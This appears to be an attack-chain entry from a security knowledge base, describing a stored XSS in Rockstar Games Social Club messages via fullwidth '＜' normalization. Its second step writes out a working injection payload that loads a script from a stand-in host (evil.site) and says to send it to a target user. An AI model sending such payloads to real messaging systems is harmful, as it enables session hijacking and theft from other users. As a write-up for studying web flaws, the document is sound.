---
tags:
  - xss
  - stored-xss
  - web-vulnerability
  - character-normalization
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands: []
platforms:
  - Web
complexity: medium
procedures:
  - '[[procedures/Discover-Character-Normalization-Issue]]'
  - '[[procedures/Craft-and-Inject-XSS-Payload]]'
  - '[[procedures/Demonstrate-XSS-Execution]]'
step_count: 3
techniques:
  - '[[JavaScript]]'
description: >-
  Multi-stage attack chain exploiting a stored XSS vulnerability in the Rockstar
  Games Social Club Message system through character normalization and improper
  escaping.
skill_level: intermediate
impact_level: high
id: 4d124cd3-06c2-438c-a346-17c954c40e68
created_at: '2025-12-11T06:06:04.866Z'
updated_at: '2025-12-11T06:06:04.866Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1059.007]]'
---
# Stored XSS via Character Normalization in Rockstar Social Club Messages

Multi-stage attack chain demonstrating the exploitation of a stored XSS vulnerability in the Rockstar Games Social Club Message system. The attack involves discovering a character normalization issue where '＜' is converted to '<', combined with improper escaping, allowing the injection of malicious scripts. This can lead to arbitrary JavaScript execution in victims' browsers, potentially enabling session hijacking or data theft.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Discover Normalization] --> B[Craft Payload]
    B --> C[Execute XSS]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- None specified

### Target Environment

- Web platform
- Rockstar Games Social Club Message system
- Browser access to the target website

### Initial Access Requirements

- Ability to send messages via the Social Club system
- Access to a malicious script hosting site (e.g., evil.site)

## Detailed Attack Procedures

### Step 1: Discover Normalization - [[procedures/Discover-Character-Normalization-Issue]]

**Procedure**: [[procedures/Discover-Character-Normalization-Issue]]

**Objective**: Identify the vulnerability in character handling where '＜' is normalized to '<' and not properly escaped.

**Expected Output**: Confirmation that the '<' character is not escaped in rendered messages.

**Success Indicators**:
- Observation of character normalization in message rendering
- Ability to insert unescaped '<' via normalization

First, test the message system by sending a message containing '＜' and observe if it renders as '<' without escaping.

Validate by inspecting the HTML output of the message.

### Step 2: Craft Payload - [[procedures/Craft-and-Inject-XSS-Payload]]

**Procedure**: [[procedures/Craft-and-Inject-XSS-Payload]]

**Objective**: Create and send a malicious payload that exploits the normalization to inject a script tag.

**Expected Output**: Successful injection of the payload into the message system.

**Success Indicators**:
- Payload is stored and visible in the message interface
- No immediate sanitization or rejection of the payload

Craft the payload as follows:

```
=\[̕h+͓.＜script/src=//evil.site/poc.js>.͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕\
```

Send this payload via the Social Club Message system to a target user or yourself for testing.

### Step 3: Demonstrate Execution - [[procedures/Demonstrate-XSS-Execution]]

**Procedure**: [[procedures/Demonstrate-XSS-Execution]]

**Objective**: Trigger the stored payload to execute arbitrary JavaScript in the victim's browser.

**Expected Output**: Execution of the script from //evil.site/poc.js.

**Success Indicators**:
- Alert or console log from the executed script
- Confirmation of script loading in browser developer tools

View the message containing the payload in a browser, and observe the script loading and executing.

## Attack Chain Summary

### Key Achievements

1. Identification of character normalization vulnerability
2. Successful injection of stored XSS payload
3. Demonstration of arbitrary script execution

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

*Last updated: 2023-10-01*
